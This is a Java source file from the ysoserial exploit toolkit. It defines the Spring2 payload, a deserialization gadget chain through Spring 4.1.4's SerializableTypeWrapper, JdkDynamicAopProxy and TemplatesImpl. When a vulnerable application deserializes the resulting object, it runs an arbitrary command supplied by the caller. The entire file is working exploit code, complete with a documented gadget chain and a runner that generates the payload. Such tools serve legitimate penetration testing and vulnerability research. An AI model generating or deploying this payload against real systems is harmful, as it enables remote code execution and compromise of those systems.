package ysoserial.payloads;


import static java.lang.Class.forName;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import javax.xml.transform.Templates;

import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.SingletonTargetSource;

import sun.reflect.ReflectionFactory;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * 
 * Just a PoC to proof that the ObjectFactory stuff is not the real problem.
 * 
 * Gadget chain:
 * TemplatesImpl.newTransformer()
 * Method.invoke(Object, Object...)
 * AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])
 * JdkDynamicAopProxy.invoke(Object, Method, Object[])
 * $Proxy0.newTransformer()
 * Method.invoke(Object, Object...)
 * SerializableTypeWrapper$MethodInvokeTypeProvider.readObject(ObjectInputStream)
 * 
 * @author mbechler
 */

@SuppressWarnings ( {
    "restriction", "nls"
} )
@Dependencies ( {
    "org.springframework:spring-core:4.1.4.RELEASE", "org.springframework:spring-aop:4.1.4.RELEASE", 
    // test deps
    "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2"
} )
public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject ( final String command ) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        AdvisedSupport as = new AdvisedSupport();
        as.setTargetSource(new SingletonTargetSource(templates));

        final Type typeTemplatesProxy = Gadgets.createProxy(
            (InvocationHandler) Reflections.getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as),
            Type.class,
            Templates.class);

        final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
            Gadgets.createMap("getType", typeTemplatesProxy),
            forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

        ReflectionFactory rf = ReflectionFactory.getReflectionFactory();
        Constructor<?> sc = rf.newConstructorForSerialization(
            Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider"),
            Object.class.getConstructor());

        final Object mitp = sc.newInstance();
        Reflections.setFieldValue(mitp, "provider", typeProviderProxy);
        Reflections.setFieldValue(mitp, "methodName", "newTransformer");
        return mitp;
    }


    /**
     * 
     * @param args
     * @throws Exception
     */
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Spring2.class, args);
    }

}
